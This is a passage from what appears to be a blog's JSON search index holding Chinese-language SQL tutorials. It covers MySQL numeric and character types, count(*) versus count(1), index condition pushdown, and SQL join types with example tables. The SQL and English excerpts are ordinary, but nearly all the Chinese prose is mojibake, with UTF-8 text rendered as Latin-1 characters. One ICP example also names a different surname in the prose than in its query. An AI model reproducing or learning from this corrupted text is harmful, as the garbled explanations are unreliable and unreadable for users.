‡å‡†çš„SQLæ•°å€¼æ•°æ®ç±»å‹ã€‚è¿™äº›ç±»å‹åŒ…æ‹¬ç²¾ç¡®çš„æ•°å­—æ•°æ®ç±»å‹ï¼ˆINTEGERã€SMALLINTã€DECIMALå’ŒNUMERICï¼Œä»¥åŠè¿‘ä¼¼æ•°å­—æ•°æ®ç±»å‹ï¼ˆFLOATã€REALå’ŒDOUBLE PRECISIONï¼‰ã€‚\n\n+ INTæ˜¯INTEGERçš„åŒä¹‰è¯ã€‚\n\n+ DEC, FIXED, NUMERICæ˜¯DECIMALçš„åŒä¹‰è¯ã€‚\n\n+ DOUBLEè§†ä¸ºDOUBLE PRECISIONï¼ˆéæ ‡å‡†æ‰©å±•ï¼‰çš„åŒä¹‰è¯ã€‚\n\n+ REALè§†ä¸ºDOUBLE PRECISIONï¼ˆéæ ‡å‡†å˜ä½“ï¼‰çš„åŒä¹‰è¯ï¼Œé™¤éå¯ç”¨REAL_AS_FLOAT SQLæ¨¡å¼ã€‚\n\nä»MySQL8.0.17å¼€å§‹ï¼ŒZEROFILLå±æ€§ä¸æ¨èç”¨äºæ•°å€¼æ•°æ®ç±»å‹ï¼Œåœ¨æœªæ¥çš„MySQLç‰ˆæœ¬ä¸­ï¼Œå¯¹å®ƒçš„æ”¯æŒå°†è¢«åˆ é™¤ã€‚\n\n<!-- more -->\n\n### 1.1 æ•´æ•°\n\nå¯¹äºæ•´æ•°æ•°æ®ç±»å‹ï¼ŒMè¡¨ç¤ºæœ€å¤§æ˜¾ç¤ºå®½åº¦ã€‚æœ€å¤§æ˜¾ç¤ºå®½åº¦ä¸º255ã€‚æ˜¾ç¤ºå®½åº¦ä¸ç±»å‹å¯ä»¥å­˜å‚¨çš„å€¼èŒƒå›´æ— å…³ã€‚\n\n| Type      | Storage (Bytes) | Minimum Value Signed | Minimum Value Unsigned | Maximum Value Signed | Maximum Value Unsigned |\n| --------- | --------------- | -------------------- | ---------------------- | -------------------- | ---------------------- |\n| TINYINT   | 1               | -128                 | 0                      | 127                  | 255                    |\n| SMALLINT  | 2               | -32768               | 0                      | 32767                | 65535                  |\n| MEDIUMINT | 3               | -8388608             | 0                      | 8388607              | 16777215               |\n| INT       | 4               | -2147483648          | 0                      | 2147483647           | 4294967295             |\n| BIGINT    | 8               | -2^63                | 0                      | 2^63 -1              | 2^64 -1                |\n\n+ [TINYINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA very small integer. The signed range is -128 to 127. The unsigned range is 0 to 255.\n\n\n\n+ [BOOL](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html), [BOOLEAN](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nThese types are synonyms for [TINYINT(1)](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html). A value of zero is considered false. Nonzero values are considered true\n\n\n\n+ [SMALLINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA small integer. The signed range is -32768 to 32767. The unsigned range is 0 to 65535.\n\n\n\n+ [MEDIUMINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA medium-sized integer. The signed range is -8388608 to 8388607. The unsigned range is 0 to 16777215.\n\n\n\n+ [INT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\n  [INTEGER[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA normal-size integer. The signed range is -2147483648 to 2147483647. The unsigned range is 0 to 4294967295.\n\n\n\n+ [BIGINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA large integer. The signed range is -9223372036854775808 to 9223372036854775807. The unsigned range is 0 to 18446744073709551615.\n\n\n\n### 1.2 å°æ•°\n\nå¯¹äºæµ®ç‚¹å’Œå®šç‚¹æ•°æ®ç±»å‹ï¼ŒMæ˜¯å¯å­˜å‚¨çš„æ€»ä½æ•°ã€‚\n\n+ ç¬¬ä¸€ç±»\n\n[DECIMAL[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[DEC[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[NUMERIC[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[FIXED[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n\n\nMæ˜¯æ€»ä½æ•°ï¼ˆç²¾åº¦ï¼‰ï¼ŒDæ˜¯å°æ•°ç‚¹åçš„ä½æ•°ï¼ˆåˆ»åº¦ï¼‰ã€‚åè¿›åˆ¶çš„æœ€å¤§ä½æ•°ï¼ˆMï¼‰ä¸º65ã€‚æ”¯æŒçš„æœ€å¤§å°æ•°ä½æ•°ï¼ˆDï¼‰ä¸º30ã€‚\n\nå¦‚æœçœç•¥Mï¼Œé»˜è®¤å€¼ä¸º10ã€‚å¦‚æœçœç•¥Dï¼Œé»˜è®¤å€¼ä¸º0ã€‚\n\nå°æ•°ç‚¹å’Œï¼ˆå¯¹äºè´Ÿæ•°ï¼‰ç¬¦å·ä¸è®¡ç®—åœ¨Mä¸­ã€‚å¦‚æœDä¸º0ï¼Œåˆ™å€¼æ²¡æœ‰å°æ•°ç‚¹æˆ–å°æ•°éƒ¨åˆ†ã€‚\n\nä»MySQL 8.0.17å¼€å§‹ï¼ŒDECIMALç±»å‹çš„åˆ—ï¼ˆä»¥åŠä»»ä½•åŒä¹‰è¯ï¼‰éƒ½ä¸æ¨èä½¿ç”¨UNSIGNEDå±æ€§ï¼Œåœ¨å°†æ¥çš„MySQLç‰ˆæœ¬ä¸­ï¼Œå°†åˆ é™¤å¯¹å®ƒçš„æ”¯æŒã€‚\n\n\n\n+ ç¬¬äºŒç±»\n\n[FLOAT[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nMæ˜¯æ€»ä½æ•°ï¼ŒDæ˜¯å°æ•°ç‚¹åçš„ä½æ•°ã€‚å¦‚æœçœç•¥Må’ŒDï¼Œåˆ™å€¼å­˜å‚¨åœ¨ç¡¬ä»¶å…è®¸çš„èŒƒå›´å†…ã€‚å•ç²¾åº¦æµ®ç‚¹æ•°ç²¾ç¡®åˆ°å°æ•°ç‚¹å7ä½å·¦å³ã€‚\n\nFLOATï¼ˆMï¼ŒDï¼‰æ˜¯ä¸€ä¸ªéæ ‡å‡†çš„MySQLæ‰©å±•ã€‚ä»MySQL 8.0.17å¼€å§‹ï¼Œä¸æ¨èä½¿ç”¨è¿™ç§è¯­æ³•ï¼Œåœ¨å°†æ¥çš„MySQLç‰ˆæœ¬ä¸­å°†åˆ é™¤å¯¹å®ƒçš„æ”¯æŒã€‚\n\n\n\n+ ç¬¬ä¸‰ç±»\n\n[DOUBLE[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n[DOUBLE PRECISION[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n[REAL[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nMæ˜¯æ€»ä½æ•°ï¼ŒDæ˜¯å°æ•°ç‚¹åçš„ä½æ•°ã€‚å¦‚æœçœç•¥Må’ŒDï¼Œåˆ™å€¼å­˜å‚¨åœ¨ç¡¬ä»¶å…è®¸çš„èŒƒå›´å†…ã€‚åŒç²¾åº¦æµ®ç‚¹æ•°ç²¾ç¡®åˆ°å°æ•°ç‚¹å15ä½å·¦å³ã€‚DOUBLEï¼ˆMï¼ŒDï¼‰æ˜¯ä¸€ä¸ªéæ ‡å‡†çš„MySQLæ‰©å±•ã€‚ä»MySQL 8.0.17å¼€å§‹ï¼Œä¸æ¨èä½¿ç”¨è¿™ç§è¯­æ³•ï¼Œåœ¨å°†æ¥çš„MySQLç‰ˆæœ¬ä¸­å°†åˆ é™¤å¯¹å®ƒçš„æ”¯æŒã€‚\n\n\n\n+ ç¬¬å››ç±»\n\n[FLOAT(**p**) [UNSIGNED\\] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nå¦‚æœpä»0åˆ°24ï¼Œæ•°æ®ç±»å‹å˜ä¸ºFLOATï¼Œæ²¡æœ‰Mæˆ–Då€¼ã€‚å¦‚æœpä»25åˆ°53ï¼Œæ•°æ®ç±»å‹å˜ä¸ºDOUBLEï¼Œæ²¡æœ‰Mæˆ–Då€¼ã€‚\n\n\n\n### 1.3 æ€»ç»“\n\n+ æµ®ç‚¹æ•°ä¸æ¨èä½¿ç”¨ FLOAT å’Œ DOUBLE\n+ æµ®ç‚¹æ•°æ¨èä½¿ç”¨DECIMAL, ä¸æ¨èä½¿ç”¨æ— ç¬¦å·\n\n\n\n# 2. int(11)  æ‹¬å·çš„æ•°å­—\n\nå¯¹äºæ•´æ•°æ•°æ®ç±»å‹ï¼ŒMè¡¨ç¤ºæœ€å¤§æ˜¾ç¤ºå®½åº¦ã€‚æœ€å¤§æ˜¾ç¤ºå®½åº¦ä¸º255ã€‚æ˜¾ç¤ºå®½åº¦ä¸ç±»å‹å¯ä»¥å­˜å‚¨çš„å€¼èŒƒå›´æ— å…³ã€‚\n\n### 2.1 int(1)ã€tinyint(4) å“ªä¸ªå¤§?\n\nint å¤§ã€‚\n\næ³¨æ„æ•°å­—ç±»å‹åé¢æ‹¬å·ä¸­çš„æ•°å­—ï¼Œä¸è¡¨ç¤ºé•¿åº¦ï¼Œè¡¨ç¤ºçš„æ˜¯æ˜¾ç¤ºå®½åº¦ï¼Œè¿™ç‚¹ä¸ varcharã€char åé¢çš„æ•°å­—å«ä¹‰æ˜¯ä¸åŒçš„ã€‚\n\nä¹Ÿå°±æ˜¯è¯´ä¸ç®¡ int åé¢çš„æ•°å­—æ˜¯å¤šå°‘ï¼Œå®ƒå­˜å‚¨çš„èŒƒå›´å§‹ç»ˆæ˜¯ -2^31 åˆ° 2^31 - 1ï¼Œä½†æ˜¯int(1)åªæ˜¾ç¤ºä¸ªä½æ•°ã€‚\n\nç»¼ä¸Šæ•´å‹çš„æ•°æ®ç±»å‹æ‹¬å·å†…çš„æ•°å­—ä¸ç®¡æ˜¯å¤šå°‘ï¼Œæ‰€å çš„å­˜å‚¨ç©ºé—´éƒ½æ˜¯ä¸€æ ·ã€‚\n\n\n\n# 3. char(4) å’Œ varchar(4) æ‹¬å·çš„æ•°å­—\n\nCHARå’ŒVARCHARç±»å‹å£°æ˜çš„é•¿åº¦æŒ‡ç¤ºè¦å­˜å‚¨çš„æœ€å¤§å­—ç¬¦æ•°ã€‚\n\nä¾‹å¦‚ï¼ŒCHARï¼ˆ30ï¼‰æœ€å¤šå¯å®¹çº³30ä¸ªå­—ç¬¦ã€‚å¦‚æœæ˜¯utf8mb4æ ¼å¼, æœ€å¤šå¯å®¹çº³30ä¸ªå­—ç¬¦æˆ–æ±‰å­—ã€‚\n\n### 3.1 é•¿åº¦é™åˆ¶\n\nCHARåˆ—çš„é•¿åº¦å›ºå®šä¸ºåˆ›å»ºè¡¨æ—¶å£°æ˜çš„é•¿åº¦ã€‚é•¿åº¦å¯ä»¥æ˜¯0åˆ°255ä¹‹é—´çš„ä»»ä½•å€¼ã€‚\n\nVARCHARåˆ—ä¸­çš„å€¼æ˜¯å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚é•¿åº¦å¯ä»¥æŒ‡å®šä¸º0åˆ°65535ä¹‹é—´çš„å€¼ã€‚VARCHARçš„æœ‰æ•ˆæœ€å¤§é•¿åº¦å–å†³äºæœ€å¤§è¡Œå¤§å°å’Œä½¿ç”¨çš„å­—ç¬¦é›†ã€‚\n\n\n\n### 3.2 å¡«ç©ºå’Œæˆªæ–­\n\nå½“å­˜å‚¨CHARå€¼æ—¶ï¼Œå°†ä½¿ç”¨æŒ‡å®šé•¿åº¦çš„ç©ºæ ¼å¯¹å…¶è¿›è¡Œå³å¡«å……ã€‚\n\nVARCHARå€¼åœ¨å­˜å‚¨æ—¶ä¸å¡«å……ã€‚åœ¨å­˜å‚¨å’Œæ£€ç´¢å€¼æ—¶ï¼Œå°¾éƒ¨ç©ºæ ¼å°†è¢«ä¿ç•™ï¼Œè¿™ä¸æ ‡å‡†SQLä¸€è‡´ã€‚\n\n\n\nå¦‚æœæœªå¯ç”¨strict SQLæ¨¡å¼ï¼Œå¹¶ä¸”å°†å€¼åˆ†é…ç»™è¶…è¿‡è¯¥åˆ—æœ€å¤§é•¿åº¦çš„CHARæˆ–VARCHARåˆ—ï¼Œåˆ™ä¼šæˆªæ–­è¯¥å€¼ä»¥é€‚åˆè¯¥åˆ—ï¼Œå¹¶ç”Ÿæˆè­¦å‘Šã€‚\n\nå¯¹äºéç©ºæ ¼å­—ç¬¦çš„æˆªæ–­ï¼Œå¯ä»¥ä½¿ç”¨strict SQLæ¨¡å¼å¯¼è‡´å‘ç”Ÿé”™è¯¯ï¼ˆè€Œä¸æ˜¯è­¦å‘Šï¼‰å¹¶ç¦æ­¢æ’å…¥å€¼ã€‚\n\n\n\n### 3.3 ç¤ºä¾‹\n\nä¸‹è¡¨é€šè¿‡æ˜¾ç¤ºå°†å„ç§å­—ç¬¦ä¸²å€¼å­˜å‚¨åˆ°CHARï¼ˆ4ï¼‰å’ŒVARCHARï¼ˆ4ï¼‰åˆ—ä¸­çš„ç»“æœï¼ˆå‡è®¾åˆ—ä½¿ç”¨å•å­—èŠ‚å­—ç¬¦é›†ï¼Œå¦‚latin1ï¼‰ï¼Œè¯´æ˜äº†CHARå’ŒVARCHARä¹‹é—´çš„åŒºåˆ«ã€‚\n\n| Value      | CHAR(4) | Storage Required | VARCHAR(4) | Storage Required |\n| ---------- | ------- | ---------------- | ---------- | ---------------- |\n| ''         | '  '    | 4 bytes          | ''         | 1 byte           |\n| 'ab'       | 'ab '   | 4 bytes          | 'ab'       | 3 bytes          |\n| 'abcd'     | 'abcd'  | 4 bytes          | 'abcd'     | 5 bytes          |\n| 'abcdefgh' | 'abcd'  | 4 bytes          | 'abcd'     | 5 bytes          |\n\n\n\n# 4. count(*), count(1) çš„åŒºåˆ«\n\n\n\n### 4.1 count(*), count(1), count(column)\n\n- COUNT(*) counts all rows\n- COUNT(column) counts non-NULLs only\n- [COUNT(1) is the same as COUNT(*)](https://stackoverflow.com/a/1221649/27535) because 1 is a non-null expressions\n\nYour use of COUNT(*) or COUNT(column) should be based on the desired output *only*.\n\n\n\n### 4.2 count(*), count(1)\n\nSame IO, same plan, the works\n\n\n\n# 5. ç´¢å¼•æ¡ä»¶ä¸‹æ¨ä¼˜åŒ–\n\nç´¢å¼•æ¡ä»¶ä¸‹æ¨ä¼˜åŒ–ï¼ˆIndex Condition Pushdown (ICP) ï¼‰æ˜¯MySQL5.6æ·»åŠ çš„ï¼Œç´¢å¼•æ¡ä»¶ä¸‹æ¨ä¼˜åŒ–å¯ä»¥å‡å°‘å­˜å‚¨å¼•æ“æŸ¥è¯¢åŸºç¡€è¡¨çš„æ¬¡æ•°ï¼Œä¹Ÿå¯ä»¥å‡å°‘MySQLæœåŠ¡å™¨ä»å­˜å‚¨å¼•æ“æ¥æ”¶æ•°æ®çš„æ¬¡æ•°ã€‚\n\nç´¢å¼•ä¸‹æ¨ä¼˜åŒ–æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„è„šæœ¬æ§åˆ¶å¼€å…³ã€‚\n\n```sql\nSET optimizer_switch = 'index_condition_pushdown=off';  \nSET optimizer_switch = 'index_condition_pushdown=on';\n```\n\nåœ¨å¼€å§‹ä¹‹å‰å…ˆå…ˆå‡†å¤‡ä¸€å¼ ç”¨æˆ·è¡¨(user)ï¼Œå…¶ä¸­ä¸»è¦å‡ ä¸ªå­—æ®µæœ‰ï¼šidã€nameã€ageã€addressã€‚å»ºç«‹è”åˆç´¢å¼•ï¼ˆnameï¼Œageï¼‰ã€‚\n\n```sql\nSELECT * from user where name like 'åˆ˜%'\n```\n\næ ¹æ® \"æœ€ä½³å·¦å‰ç¼€\" çš„åŸåˆ™ï¼Œè¿™é‡Œä½¿ç”¨äº†è”åˆç´¢å¼•ï¼ˆnameï¼Œageï¼‰è¿›è¡Œäº†æŸ¥è¯¢ï¼Œæ€§èƒ½è¦æ¯”å…¨è¡¨æ‰«æè‚¯å®šè¦é«˜ã€‚\n\né—®é¢˜æ¥äº†ï¼Œå¦‚æœæœ‰å…¶ä»–çš„æ¡ä»¶å‘¢ï¼Ÿå‡è®¾åˆæœ‰ä¸€ä¸ªéœ€æ±‚ï¼Œè¦æ±‚åŒ¹é…å§“åç¬¬ä¸€ä¸ªå­—ä¸ºé™ˆï¼Œå¹´é¾„ä¸º20å²çš„ç”¨æˆ·ï¼Œæ­¤æ—¶çš„sqlè¯­å¥å¦‚ä¸‹ï¼š\n\n```sql\nSELECT * from user where name like 'åˆ˜%' and age=20\n```\n\n5.6ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯æ²¡æœ‰ç´¢å¼•ä¸‹æ¨è¿™ä¸ªä¼˜åŒ–,  ä¼šå¿½ç•¥ageè¿™ä¸ªå­—æ®µï¼Œç›´æ¥é€šè¿‡nameè¿›è¡ŒæŸ¥è¯¢ï¼Œåœ¨(name,age)è¿™è¯¾æ ‘ä¸ŠæŸ¥æ‰¾åˆ°äº†ä¸¤ä¸ªç»“æœï¼Œç„¶åæ‹¿ç€å–åˆ°çš„idå€¼ä¸€æ¬¡æ¬¡çš„å›è¡¨æŸ¥è¯¢ï¼Œå› æ­¤è¿™ä¸ªè¿‡ç¨‹éœ€è¦å›è¡¨ä¸¤æ¬¡ã€‚\n\n5.6ç‰ˆæœ¬æ·»åŠ äº†ç´¢å¼•ä¸‹æ¨è¿™ä¸ªä¼˜åŒ–, å¹¶æ²¡æœ‰å¿½ç•¥ageè¿™ä¸ªå­—æ®µï¼Œè€Œæ˜¯åœ¨ç´¢å¼•å†…éƒ¨å°±åˆ¤æ–­äº†ageæ˜¯å¦ç­‰äº20ï¼Œå¯¹äºä¸ç­‰äº20çš„è®°å½•ç›´æ¥è·³è¿‡ï¼Œå› æ­¤åœ¨(name,age)è¿™æ£µç´¢å¼•æ ‘ä¸­åªåŒ¹é…åˆ°äº†ä¸€ä¸ªè®°å½•ï¼Œæ­¤æ—¶æ‹¿ç€è¿™ä¸ªidå»ä¸»é”®ç´¢å¼•æ ‘ä¸­å›è¡¨æŸ¥è¯¢å…¨éƒ¨æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹åªéœ€è¦å›è¡¨ä¸€æ¬¡ã€‚\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://dev.mysql.com/doc/refman/8.0/en/numeric-type-syntax.html\n+ https://dev.mysql.com/doc/refman/8.0/en/char.html\n+ https://stackoverflow.com/a/3003533\n+ https://dev.mysql.com/doc/refman/8.0/en/index-condition-pushdown-optimization.html","tags":["mysql"],"categories":["sql"]},{"title":"sqlçš„joinä»‹ç»","url":"%2Fp%2F289dcf0b.html","content":"\n\n\n# 1.  joinç±»å‹\n\nåœ¨å…³ç³»ä»£æ•°ä¸­ï¼Œè¿æ¥è¿ç®—æ˜¯ç”±ä¸€ä¸ªç¬›å¡å°”ç§¯è¿ç®—å’Œä¸€ä¸ªé€‰å–è¿ç®—æ„æˆçš„ã€‚é¦–å…ˆç”¨ç¬›å¡å°”ç§¯å®Œæˆå¯¹ä¸¤ä¸ªæ•°æ®é›†åˆçš„ä¹˜è¿ç®—ï¼Œç„¶åå¯¹ç”Ÿæˆçš„ç»“æœé›†åˆè¿›è¡Œé€‰å–è¿ç®—ï¼Œç¡®ä¿åªæŠŠåˆ†åˆ«æ¥è‡ªä¸¤ä¸ªæ•°æ®é›†åˆå¹¶ä¸”å…·æœ‰é‡å éƒ¨åˆ†çš„è¡Œåˆå¹¶åœ¨ä¸€èµ·ã€‚\n\nè¿æ¥çš„å…¨éƒ¨æ„ä¹‰åœ¨äºåœ¨æ°´å¹³æ–¹å‘ä¸Šåˆå¹¶ä¸¤ä¸ªæ•°æ®é›†åˆï¼ˆé€šå¸¸æ˜¯è¡¨ï¼‰ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªæ–°çš„ç»“æœé›†åˆï¼Œå…¶æ–¹æ³•æ˜¯å°†ä¸€ä¸ªæ•°æ®æºä¸­çš„è¡Œäºå¦ä¸€ä¸ªæ•°æ®æºä¸­å’Œå®ƒåŒ¹é…çš„è¡Œç»„åˆæˆä¸€ä¸ªæ–°å…ƒç»„ã€‚\n\nSQLæä¾›äº†å¤šç§ç±»å‹çš„è¿æ¥æ–¹å¼ï¼Œå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åœ¨äºï¼šä»ç›¸äº’äº¤å çš„ä¸åŒæ•°æ®é›†åˆä¸­é€‰æ‹©ç”¨äºè¿æ¥çš„è¡Œæ—¶æ‰€é‡‡ç”¨çš„æ–¹æ³•ä¸åŒã€‚\n\n<!-- more -->\n\n### 1.1  joinåˆ†ç±»\n\n| è¿æ¥ç±»å‹   | è¿æ¥ç§ç±»         | å®šä¹‰                                                         |\n| ---------- | ---------------- | ------------------------------------------------------------ |\n| Inner Join | Inner Join       | å†…è¿æ¥æ˜¯æœ€å¸¸è§çš„ä¸€ç§è¿æ¥ï¼Œå®ƒä¹Ÿè¢«ç§°ä¸ºæ™®é€šè¿æ¥ï¼Œåªè¿æ¥åŒ¹é…çš„è¡Œï¼ˆä»…å¯¹æ»¡è¶³è¿æ¥æ¡ä»¶çš„CROSSä¸­çš„åˆ—ï¼‰ã€‚å®ƒåˆåˆ†ä¸ºç­‰å€¼è¿æ¥ï¼ˆè¿æ¥æ¡ä»¶è¿ç®—ç¬¦ä¸º\"=\"ï¼‰å’Œä¸ç­‰å€¼è¿æ¥ï¼ˆè¿æ¥æ¡ä»¶è¿ç®—ç¬¦ä¸ä¸º\"=\"ï¼Œä¾‹å¦‚between...andï¼‰ã€‚ |\n| Outer Join | Full Outer Join  | FULL JOIN ä¼šä»å·¦è¡¨ å’Œå³è¡¨ é‚£é‡Œè¿”å›æ‰€æœ‰çš„è¡Œã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨çš„æ•°æ®è¡Œåœ¨å¦ä¸€ä¸ªè¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œé‚£ä¹ˆå¯¹é¢çš„æ•°æ®ç”¨NULLä»£æ›¿ã€‚ |\n| Outer Join | Left Outer Join  | LEFT JOINè¿”å›å·¦è¡¨çš„å…¨éƒ¨è¡Œå’Œå³è¡¨æ»¡è¶³ONæ¡ä»¶çš„è¡Œï¼Œå¦‚æœå·¦è¡¨çš„è¡Œåœ¨å³è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œå³è¡¨ä¸­å¯¹åº”æ•°æ®ç”¨NULLä»£æ›¿ã€‚ |\n| Outer Join | Right Outer Join | RIGHT JOINè¿”å›å³è¡¨çš„å…¨éƒ¨è¡Œå’Œå·¦è¡¨æ»¡è¶³ONæ¡ä»¶çš„è¡Œï¼Œå¦‚æœå³è¡¨çš„è¡Œåœ¨å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œå·¦è¡¨ä¸­å¯¹åº”æ•°æ®ç”¨NULLä»£æ›¿ã€‚ |\n| Cross Join | Cross Join       | CROSSå¯¹ä¸¤ä¸ªè¡¨æ‰§è¡Œç¬›å¡å°”ä¹˜ç§¯ã€‚å®ƒä¸ºå·¦è¡¨è¡Œå’Œå³è¡¨è¡Œçš„æ¯ç§å¯èƒ½çš„ç»„åˆè¿”å›ä¸€è¡Œã€‚è¿”å›ï¼ˆå·¦è¡¨è¡Œæ•°*å³è¡¨è¡Œæ•°ï¼‰è¡Œçš„è¡¨ã€‚ |\n| å…¶ä»–       | è‡ªç„¶è¿æ¥         | è‡ªç„¶è¿æ¥æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç­‰å€¼è¿æ¥,åœ¨è¿æ¥æ¡ä»¶ä¸­ä½¿ç”¨ç­‰äº(=)è¿ç®—ç¬¦æ¯”è¾ƒè¢«è¿æ¥åˆ—çš„åˆ—å€¼ï¼Œä½†å®ƒä½¿ç”¨é€‰æ‹©åˆ—è¡¨æŒ‡å‡ºæŸ¥è¯¢ç»“æœé›†åˆä¸­æ‰€åŒ…æ‹¬çš„åˆ—ï¼Œå¹¶åˆ é™¤è¿æ¥è¡¨ä¸­çš„é‡å¤åˆ—ã€‚ |\n| å…¶ä»–       | è‡ªè¿æ¥           | æŸä¸ªè¡¨å’Œå…¶è‡ªèº«è¿æ¥ï¼Œå¸¸ç”¨åœ¨åŒä¸€è¡¨å†…ä¸åŒæ•°æ®é—´å¯¹åŒä¸€åˆ—çš„æ¯”è¾ƒ   |\n\n### \n\n### 1.2 å¸¸è§åˆ†ç±»\n\nThere are 4 different types of Oracle joins:\n\n- Oracle INNER JOIN (or sometimes called simple join)\n- Oracle LEFT OUTER JOIN (or sometimes called LEFT JOIN)\n- Oracle RIGHT OUTER JOIN (or sometimes called RIGHT JOIN)\n- Oracle FULL OUTER JOIN (or sometimes called FULL JOIN)\n\n\n\n### 1.3 æ³¨æ„äº‹é¡¹\n\n+  LEFT JOIN and LEFT OUTER JOIN å®Œå…¨ä¸€æ ·\n+ RIGHT JOIN and RIGHT OUTER JOIN å®Œå…¨ä¸€æ ·\n+ JOIN é»˜è®¤æƒ…å†µä¸‹æ˜¯ INNER JOIN\n+ å¯¹äºINNER JOINï¼Œé¡ºåºæ— å…³ç´§è¦, å¯¹äºï¼ˆLEFTï¼ŒRIGHTæˆ–FULLï¼‰OUTER JOINï¼Œé¡ºåºå¾ˆé‡è¦\n+ Mysql  ä¸æ”¯æŒ full join\n+ Mysqlä¸­,cross join ,inner joinå’Œ joinæ‰€å®ç°çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ã€‚\n\n\n\n# 2. joinä½¿ç”¨\n\n**Examples**\n\n```sql\nA    B\n-    -\n1    3\n2    4\n3    5\n4    6\n```\n\n**Inner join**\n\n```sql\nselect * from a INNER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a = b.b;\n\na | b\n--+--\n3 | 3\n4 | 4\n```\n\n**Left outer join**\n\n```sql\nselect * from a LEFT OUTER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a = b.b(+);\n\na |  b\n--+-----\n1 | null\n2 | null\n3 |    3\n4 |    4\n```\n\n**Right outer join**\n\n```sql\nselect * from a RIGHT OUTER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a(+) = b.b;\n\na    |  b\n-----+----\n3    |  3\n4    |  4\nnull |  5\nnull |  6\n```\n\n\n\n**Full outer join**\n\n```sql\nselect * from a FULL OUTER JOIN b on a.a = b.b;\n\n a   |  b\n-----+-----\n   1 | null\n   2 | null\n   3 |    3\n   4 |    4\nnull |    6\nnull |    5\n```\n\n\n\n# 3. joinåŒºåˆ«\n\n### 3.1 inner join, outer join\n\n- An inner join of A and B gives the result of A intersect B\n- An outer join of A and B gives the results of A union B\n\n![1](sqlçš„joinä»‹ç»/1.png)\n\n\n\n\n\n### 3.2 inner join, å¤šè¡¨è¿æŸ¥\n\n```sql\nSELECT * FROM\ntable a INNER JOIN table b\nON a.id = b.id;\n```\n\nvs\n\n```sql\nSELECT a.*, b.*\nFROM table a, table b\nWHERE a.id = b.id;\n```\n\nå¤šè¡¨è¿æŸ¥, å¸¦ where æ¡ä»¶çš„ä¸€èˆ¬åˆç§°ä¸ºéšå¼å†…è¿æ¥,  åœ¨æ€§èƒ½æ–¹é¢ï¼Œå®ƒä»¬æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚\n\n\n\n### 3.3  left join, å¤šè¡¨è¿æŸ¥\n\nå®é™…é¡¹ç›®ä¸­, æœ€å¸¸ç”¨çš„ä¸¤ç§æ–¹å¼.\n\n+  left join å°±æ˜¯ left outer join, ä¸€èˆ¬ä¼šäº§ç”Ÿ null\n+ å¤šè¡¨æŸ¥è¯¢åŠ  where, å¯ä»¥ç†è§£ä¸º inner join\n\n\n\n### 3.4 on, where\n\n+ å¯¹äºinner joins, æ— å…³ç´§è¦\n\n+ å¯¹äº outer joins, å…ˆ on å where\n\n  + `ON` clause - **Before** joining.    åœ¨joinä¹‹å‰å°†è¢«è¿‡æ»¤,  æœ‰äº›ç»“æœå¯èƒ½ä¸ºnullï¼ˆå› ä¸ºouter joinï¼‰ã€‚\n\n  + `WHERE` clause: **After** joining.   åœ¨joinä¹‹åè¿‡æ»¤è®°å½•, ä¸€èˆ¬å¯ä»¥è¿‡æ»¤æ‰ nullã€‚\n\n    \n\nâ€œA LEFT JOIN B ON æ¡ä»¶è¡¨è¾¾å¼â€ ä¸­çš„ONç”¨æ¥å†³å®šå¦‚ä½•ä» B è¡¨ä¸­æ£€ç´¢æ•°æ®è¡Œã€‚å¦‚æœ B 